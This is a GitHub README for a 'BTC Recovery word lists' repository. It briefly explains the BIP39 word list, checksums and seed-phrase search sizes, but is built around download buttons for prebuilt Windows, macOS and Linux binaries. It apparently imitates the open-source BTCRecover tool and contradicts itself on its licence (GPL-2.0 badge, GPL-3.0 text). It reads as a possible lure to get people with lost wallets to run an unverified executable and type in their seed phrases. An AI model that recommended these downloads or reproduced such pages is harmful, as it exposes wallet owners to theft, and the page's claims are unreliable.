<div align="center">
<img src="assets/banner-hub.png" alt="BTC Recovery word lists">
</div>

<h1 align="center">BTC Recovery word lists</h1>

<p align="center">The vocabulary a seed-phrase search actually has to work through.</p>

<div align="center">
<a href="LICENSE"><img src="https://img.shields.io/badge/LICENSE-GPL--2.0-FCB036?style=for-the-badge&labelColor=191008" alt="License: GPL-2.0"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1"><img src="https://img.shields.io/badge/RELEASE-v2.1.1-FCB036?style=for-the-badge&labelColor=191008" alt="Release v2.1.1"></a>
</div>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

The list decides the size of every search you will read about here.

> Only download from this GitHub release page.

## What this repository is for

This repository is where the word-list side of BTC Recovery is kept. A seed phrase is drawn from a fixed list of 2,048 words, and every unknown position in a recovery is a question about one entry in that list, which is why the arithmetic of a search is so predictable and why a single mistyped word changes the entire wallet. Understanding that list is what turns a hopeless situation into a bounded one. The pages here support the recovery guides rather than replacing them: they explain the vocabulary, the checksum that the last word carries, and the difference between a word that is wrong and a word that is simply not in the list. For the search itself, the seed-phrase guides are the place to start.

## Who it is for

- You want to know why one wrong word changes every address the wallet produces.
- You are checking whether a word you remember is even part of the standard list.
- You are building a candidate list and need to know what the vocabulary allows.

## Start here

- The seed-phrase guides explain how the list is used in a search.
- The invalid-phrase guide covers a word the wallet refuses.
- The missing-words guide covers positions you do not know.

## How to use these guides

1. Establish the word count first, because it fixes the list and the checksum length.
2. Check each doubtful word against the standard list before treating it as unknown.
3. Feed the result into the matching seed-phrase guide rather than searching by hand.

## The guides, grouped

Four guides put the vocabulary to work.

| Guide | What it answers |
| --- | --- |
| [Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md) | BTCRecover fills the gaps, tests each candidate against an address that belongs to the wallet, and does it all offline on your own machine. |
| [Invalid recovery phrase: checksum and misspelled words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/invalid-recovery-phrase-btcrecover.md) | BTCRecover finds the offending word locally by testing substitutions against the phrase's own checksum and then against an address from the wallet. |
| [What a recovery phrase is, and what it is not](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/what-is-a-recovery-phrase-btcrecover.md) | A recovery phrase is a human-writable encoding of a wallet's master key: 12 to 24 words that regenerate every key and address the wallet ever used. |
| [You forgot which wallet software you used](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/forgot-which-wallet-software-btcrecover.md) | Identify the family first  -  recovery method, word list and derivation all follow from it. |

## What each guide changes

| Your situation | Guide | What you end up with |
| --- | --- | --- |
| A recovery that needs a plan | The seed phrase guides | A search small enough to run, checked against one address. |
| A wallet file with no password | The wallet file guides | Candidates tested against a copy of the file, offline. |
| A download you want to check | The tool guides | The published checksum and the file that matches it. |

## Common first questions

### How many words are in the list?

2,048, which is why one unknown word is a short job and three unknown words is a much larger one.

### Can a phrase use words outside the list?

Not a standard BIP39 phrase. A wallet from an older or different system may, and the legacy-format guide covers that case.

### Why does one wrong word change every address?

Because the wallet derives all of its keys from the whole phrase in order, so a single substitution changes the input to every key it produces.

## Before you install

Install the current release before you use any of this, and treat the word list as reference material rather than a search tool. The vocabulary is fixed, the checksum is fixed, and the only variable in a recovery is what you can prove about the wallet. Keep the address you are checking against somewhere you can read it without opening the wallet itself.

## About

The word-list pages exist because the arithmetic of a seed-phrase recovery is the arithmetic of this list. Once you know that one unknown position is 2,048 questions and that a second unknown multiplies it again, the difference between a short job and an impossible one stops being a mystery. The seed-phrase guides take that understanding and turn it into a run.

## License

These word lists ship under the GPL-3.0 licence, with the complete terms in [LICENSE](LICENSE).

---

**BTC Recovery word lists** - one page of the BTC Recovery account.

Links: [the profile](https://github.com/btc-wallet-recovery/btc-wallet-recovery) - [the application](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software) - [the seed phrase guides](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery) - [the wallet file guides](https://github.com/btc-wallet-recovery/btcrecover-password-recovery) - [the tool guides](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool).
